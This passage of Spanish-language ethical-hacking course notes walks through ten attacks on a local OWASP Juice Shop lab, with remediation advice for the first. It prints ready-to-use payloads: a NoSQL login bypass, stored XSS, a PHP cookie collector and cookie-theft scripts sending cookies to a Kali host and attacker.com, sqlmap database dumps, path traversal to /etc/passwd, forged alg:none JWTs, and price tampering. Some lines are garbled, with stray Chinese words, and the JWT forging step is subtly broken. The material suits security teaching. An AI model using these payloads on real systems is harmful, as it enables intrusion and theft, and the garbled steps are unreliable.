     -d '{"email":{"$ne":""},"password":{"$ne":""}}'

2. El servidor responde con un token JWT válido y datos del admin:
   
   {
     "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
     "user": {
       "id": 1,
       "email": "admin@juice-sh.op",
       "role": "admin"
     }
   }

3. Con el token, acceder a recursos protegidos:
   
   curl -H "Authorization: Bearer <token>" \
     http://192.168.56.101:3000/api/users

EVIDENCIA:
[Captura de pantalla de la respuesta del servidor mostrando el token JWT
y datos del administrador]

IMPACTO:
| Aspecto        | Nivel    | Descripción                           |
|----------------|----------|---------------------------------------|
| Confidencialidad | CRÍTICO | Acceso a todos los datos de usuarios |
| Integridad     | ALTO     | Modificación de datos del sistema    |
| Disponibilidad | MEDIO    | Potencial denegación de servicio      |

RIESGO GENERAL: CRÍTICO

RECOMENDACIONES:

1. Implementar validación de tipos de datos:
   if (typeof req.body.email !== 'string') {
     return res.status(400).send('Invalid input');
   }

2. Sanitizar operadores MongoDB:
   function sanitizeMongoQuery(input) {
     if (typeof input === 'object') {
       throw new Error('Operators not allowed');
     }
     return String(input);
   }

3. Usar consultas parametrizadas o ORM:
   const user = await User.findOne({
     email: String(req.body.email),
     passwordHash: await hash(req.body.password)
   });

4. Implementar rate limiting en login.

REFERENCIAS:
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_NoSQL_Injection
- https://www.mongodb.com/docs/manual/security/

================================================================================
```

### 13.3. Vulnerabilidad #2: XSS Almacenado (A03:2021)

```
┌─────────────────────────────────────────────────────────────────┐
│     VULNERABILIDAD #2: XSS ALMACENADO                          │
│     Categoría OWASP: A03:2021 - Injection                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  FASE 1-3: Reconocimiento y Enumeración                        │
│  ─────────────────────────────────────────────                 │
│  Identificar endpoint de reseñas:                               │
│  curl -s http://$JUICE_IP:3000/api/products/1/reviews           │
│                                                                 │
│  FASE 4: Explotación                                           │
│  ─────────────────────────────────                             │
│  Enviar reseña con payload XSS:                                 │
│  $ curl -X POST http://$JUICE_IP:3000/api/products/1/reviews \│
│       -H "Content-Type: application/json" \                   │
│       -H "Authorization: Bearer <token>" \                    │
│       -d '{"message":"<script>alert(1)</script>","rating":5}' │
│                                                                 │
│  Verificar persistencia:                                        │
│  $ curl -s http://$JUICE_IP:3000/api/products/1/reviews       │
│  # El script se almacena sin sanitizar                         │
│                                                                 │
│  FASE 5: Post-explotación (Robo de cookies):                   │
│  ────────────────────────────────────────────────               │
│  # En Kali, crear servidor de recolección:                     │
│  mkdir -p /var/www/html/steal                                  │
│  cat > /var/www/html/steal/collect.php << 'PHP'                │
│  <?php                                                          │
│  $cookie = $_GET['c'];                                         │
│  file_put_contents('cookies.txt', date('Y-m-d H:i:s')." - $cookie\n", FILE_APPEND); │
│  ?>                                                            │
│  PHP                                                            │
│                                                                 │
│  # Payload de robo:                                            │
│  <img src=x onerror="fetch('http://192.168.56.101/steal/collect.php?c='+btoa(document.cookie))"> │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 13.4. Vulnerabilidad #3: Broken Access Control (A01:2021)

```
┌─────────────────────────────────────────────────────────────────┐
│     VULNERABILIDAD #3: ACCESS CONTROL BROKEN                    │
│     Categoría OWASP: A01:2021 - Broken Access Control           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  FASE 1-2: Reconocimiento y Escaneo                            │
│  ─────────────────────────────────────────────                 │
│  # Identificar endpoints protegidos:                            │
│  curl -s http://$JUICE_IP:3000/api/users                       │
│  # Sin auth: {"status":"error","message":"Unauthorized"}        │
│                                                                 │
│  # Con token de usuario normal:                                 │
│  curl -H "Authorization: Bearer <user_token>" \                │
│       http://$JUICE_IP:3000/api/users                           │
│  # Posible acceso no autorizado                                 │
│                                                                 │
│  FASE 4: Explotación (IDOR):                                   │
│  ─────────────────────────────────                             │
│  # Intentar acceder a回购 de otro usuario:                     │
│  $ curl -H "Authorization: Bearer <token_user>" \              │
│       http://$JUICE_IP:3000/api/orders/1                       │
│  # Muestra orden de OTRO usuario                               │
│                                                                 │
│  # Modificar回购 de otro usuario:                              │
│  $ curl -X PUT -H "Authorization: Bearer <token_user>" \       │
│       -H "Content-Type: application/json" \                    │
│       -d '{"deliveryAddress":"Ataque"}' \                      │
│       http://$JUICE_IP:3000/api/orders/2                       │
│                                                                 │
│  FASE 5: Impacto                                               │
│  ──────────────────                                             │
│  # Un usuario puede ver y modificar órdenes de otros usuarios  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 13.5. Vulnerabilidad #4: SQL Injection en Búsqueda

```
┌─────────────────────────────────────────────────────────────────┐
│     VULNERABILIDAD #4: SQL INJECTION                           │
│     Categoría OWASP: A03:2021 - Injection                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  FASE 2-3: Escaneo y Enumeración                               │
│  ─────────────────────────────────────────────                 │
│  # Verificar si la búsqueda es vulnerable:                     │
│  $ curl "http://$JUICE_IP:3000/rest/products/search?q=test'" │
│                                                                 │
│  FASE 4: Explotación con SQLMap                                 │
│  ───────────────────────────────────────────                     │
│  # Detectar vulnerabilidad:                                     │
│  sqlmap -u "http://$JUICE_IP:3000/rest/products/search?q=test" \│
│    --batch --level=5 --risk=3                                   │
│                                                                 │
│  # Extraer base de datos:                                       │
│  sqlmap -u "..." --dbs                                          │
│  sqlmap -u "..." -D juice_shop --tables                         │
│  sqlmap -u "..." -D juice_shop -T users --dump                  │
│                                                                 │
│  # Resultado: Base de datos completa extraída                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 13.6. Vulnerabilidad #5: Path Traversal

```
┌─────────────────────────────────────────────────────────────────┐
│     VULNERABILIDAD #5: PATH TRAVERSAL                          │
│     Categoría OWASP: A01:2021 - Broken Access Control           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  FASE 1: Reconocimiento                                         │
│  ─────────────────────────────────                             │
│  # Encontrar endpoint de archivos:                             │
│  $ curl -s http://$JUICE_IP:3000/ftp/                          │
│  # Lista de archivos expuestos                                 │
│                                                                 │
│  FASE 4: Explotación                                           │
│  ─────────────────────────────────                             │
│  # Leer archivos del sistema:                                  │
│  $ curl "http://$JUICE_IP:3000/ftp/eicar.pdf/..%2F..%2Fetc%2Fpasswd" │
│                                                                 │
│  # Leer config.yml:                                            │
│  $ curl "http://$JUICE_IP:3000/ftp/eicar.pdf/..%2F..%2Fconfig.yml" │
│                                                                 │
│  # Intentar leer código fuente:                                 │
│  $ curl "http://$JUICE_IP:3000/ftp/eicar.pdf/..%2F..%2Fserver.js" │
│                                                                 │
│  FASE 5: Impacto                                               │
│  ──────────────────                                             │
│  # Lectura de archivos sensibles del sistema                    │
│  # Credenciales expuestas en archivos de configuración          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 13.7. Vulnerabilidad #6: JWT sin Validación

```
┌─────────────────────────────────────────────────────────────────┐
│     VULNERABILIDAD #6: JWT ALGORITHM NONE                      │
│     Categoría OWASP: A07:2021 - Identification Failures        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  FASE 1: Obtener token válido                                  │
│  ─────────────────────────────────                             │
│  $ curl -X POST http://$JUICE_IP:3000/rest/user/login \        │
│       -d '{"email":"user@juice-sh.op","password":"user123"}'  │
│                                                                 │
│  FASE 3: Decodificar y analizar JWT                            │
│  ────────────────────────────────────────────                   │
│  # El token JWT se divide en: header.payload.signature          │
│  # Header: {"alg":"HS256","typ":"JWT"}                          │
│                                                                 │
│  FASE 4: Explotación                                           │
│  ─────────────────────────────────                             │
│  # Crear token con alg:none:                                    │
│  HEADER='{"alg":"none","typ":"JWT"}'                            │
│  PAYLOAD='{"sub":"admin","role":"admin"}'                       │
│  TOKEN=$(echo -n "$HEADER.$PAYLOAD." | base64 | tr -d '=')      │
│                                                                 │
│  # Usar token falso:                                           │
│  $ curl -H "Authorization: Bearer $TOKEN" \                   │
│       http://$JUICE_IP:3000/api/admin/users                    │
│                                                                 │
│  FASE 5: Impacto                                               │
│  ──────────────────                                             │
│  # Acceso como administrador sin credenciales                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 13.8. Vulnerabilidad #7: Stored XSS en Perfil

```
┌─────────────────────────────────────────────────────────────────┐
│     VULNERABILIDAD #7: STORED XSS EN PERFIL                    │
│     Categoría OWASP: A03:2021 - Injection                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  FASE 4: Explotación                                           │
│  ─────────────────────────────────                             │
│  # Modificar perfil con XSS:                                    │
│  $ curl -X PUT http://$JUICE_IP:3000/rest/user/profile \       │
│       -H "Authorization: Bearer <token>" \                    │
│       -H "Content-Type: application/json" \                   │
│       -d '{"fullName":"<img src=x onerror=alert(1)>"}'        │
│                                                                 │
│  # Verificar cuando admin vea el perfil:                       │
│  # El script se ejecuta en el navegador del admin              │
│                                                                 │
│  FASE 5: Escalada                                              │
│  ──────────────────                                             │
│  # Robo de tokens de administradores                            │
│  <script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script> │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 13.9. Vulnerabilidad #8: Enumeración de Usuarios

```
┌─────────────────────────────────────────────────────────────────┐
│     VULNERABILIDAD #8: USER ENUMERATION                        │
│     Categoría OWASP: A07:2021 - Auth Failures                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  FASE 1-2: Reconocimiento                                      │
│  ─────────────────────────────────                             │
│  # Intentar registro con email existente:                      │
│  $ curl -X POST http://$JUICE_IP:3000/rest/user/register \    │
│       -d '{"email":"admin@juice-sh.op","password":"test"}'    │
│                                                                 │
│  # Respuesta: "Email already exists"                           │
│  # Esto confirma que el usuario existe                          │
│                                                                 │
│  FASE 3: Enumerar usuarios                                     │
│  ─────────────────────────────────                             │
│  # Crear script para enumerar:                                 │
│  for email in admin@juice-sh.op user@juice-sh.op jim@juice.sh; do│
│    curl -s -X POST http://$JUICE_IP:3000/rest/user/register \ │
│         -d "{\"email\":\"$email\",\"password\":\"test\"}"       ││
│  done                                                          │
│                                                                 │
│  FASE 4: Impacto                                               │
│  ──────────────────                                             │
│  # Facilita ataques de fuerza bruta                            │
│  # Información para ingeniería social                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 13.10. Vulnerabilidad #9: Mass Assignment

```
┌─────────────────────────────────────────────────────────────────┐
│     VULNERABILIDAD #9: MASS ASSIGNMENT                         │
│     Categoría OWASP: A01:2021 - Broken Access Control           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  FASE 3: Enumerar campos                                        │
│  ─────────────────────────────────                             │
│  # Ver qué campos acepta el perfil                             │
│  $ curl -H "Authorization: Bearer <token>" \                  │
│       http://$JUICE_IP:3000/rest/user/whoami                  │
│                                                                 │
│  FASE 4: Explotación                                           │
│  ─────────────────────────────────                             │
│  # Intentar cambiar rol:                                       │
│  $ curl -X PUT http://$JUICE_IP:3000/rest/user/profile \       │
│       -H "Authorization: Bearer <token>" \                    │
│       -H "Content-Type: application/json" \                    │
│       -d '{"role":"admin"}'                                    │
│                                                                 │
│  # Intentar agregar campos sensibles:                           │
│  $ curl -X PUT http://$JUICE_IP:3000/rest/user/profile \       │
│       -d '{"totpSecret":"JBSWY3DPEHPK3PXP"}'                   │
│                                                                 │
│  FASE 5: Impacto                                               │
│  ──────────────────                                             │
│  # Escalada de privilegios                                     │
│  # Desactivación de MFA                                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 13.11. Vulnerabilidad #10: Price Manipulation

```
┌─────────────────────────────────────────────────────────────────┐
│     VULNERABILIDAD #10: PRICE MANIPULATION                     │
│     Categoría OWASP: A08:2021 - Software Integrity Failures     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  FASE 2-3: Entender el proceso de compra                       │
│  ─────────────────────────────────────────────                 │
│  # Ver productos y precios:                                    │
│  $ curl -s http://$JUICE_IP:3000/api/products | jq '.'        │
│  # Producto 1: Apple Juice, precio: 1.99                       │
│                                                                 │
│  FASE 4: Explotación                                           │
│  ─────────────────────────────────                             │
│  # Agregar al carrito:                                          │
│  $ curl -X POST http://$JUICE_IP:3000/api/BasketItems \        │
│       -H "Authorization: Bearer <token>" \                    │
│       -H "Content-Type: application/json" \                   │
│       -d '{"ProductId":1,"quantity":1}'                       │
│                                                                 │
│  # Modificar precio en checkout:                               │
│  $ curl -X POST http://$JUICE_IP:3000/api/checkout \           │
│       -H "Authorization: Bearer <token>" \                    │
│       -H "Content-Type: application/json" \                   │
│       -d '{"total":0.01}'                                     │
│                                                                 │
│  # Verificar si acepta el precio manipulado                    │
│                                                                 │
│  FASE 5: Impacto                                               │
│  ──────────────────                                             │
│  # Fraude financiero directo                                    │
│  # Pérdidas económicas para la empresa                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 13.12. Tabla Resumen de las 10 Vulnerabilidades

| # | Vulnerabilidad | OWASP Category | CVSS | Severidad |
|---|----------------|----------------|------|-----------|
| 1 | NoSQL Injection | A03:2021 | 9.1 | CRÍTICO |
| 2 | XSS Almacenado | A03:2021 | 8.1 | ALTO |
| 3 | Broken Access Control | A01:2021 | 8.5 | ALTO |
| 4 | SQL Injection | A03:2021 | 9.8 | CRÍTICO |
| 5 | Path Traversal | A01:2021 | 7.5 | ALTO |
| 6 | JWT sin Validación | A07:2021 | 9.1 | CRÍTICO |
| 7 | Stored XSS en Perfil | A03:2021 | 8.1 | ALTO |
| 8 | User Enumeration | A07:2021 | 4.3 | MEDIO |
| 9 | Mass Assignment | A01:2021 | 7.5 | ALTO |
| 10 | Price Manipulation | A08:2021 | 8.1 | ALTO |

---

## CONCLUSIONES DE LA SEMANA

Esta semana hemos cubierto los fundamentos esenciales para comenzar en el hacking ético:

1. **Conceptos básicos** de hacking y la distinción entre hacking malicioso y ético
2. **El ciclo de hacking** en 6 fases: Reconocimiento → Escaneo → Enumeración → Explotación → Post-Explotación → Informe
3. **Tecnologías de virtualización**: VMs, hipervisores, contenedores y sus diferencias
4. **Instalación de VirtualBox** y configuración básica
5. **Kali Linux** con herramientas detalladas: Nmap, SQLMap, John the Ripper
6. **Instalación de Kali y Juice Shop** en múltiples configuraciones
7. **Comandos esenciales** de Linux y Docker
8. **OWASP ZAP y Burp Suite** para análisis profundo de tráfico
9. **Nikto** para escaneo de vulnerabilidades web
10. **John the Ripper** para crackeo de contraseñas
11. **Pruebas de DoS** básicas
12. **10 vulnerabilidades documentadas** con metodología NIST

**Próximos pasos:**
- Practicar con máquinas virtuales vulnerables (Metasploitable, DVWA)
- Obtener certificaciones como eJPT o CEH
- Participar en plataformas CTF como HackTheBox o TryHackMe
- Desarrollar habilidades de programación (Python, Bash)

---


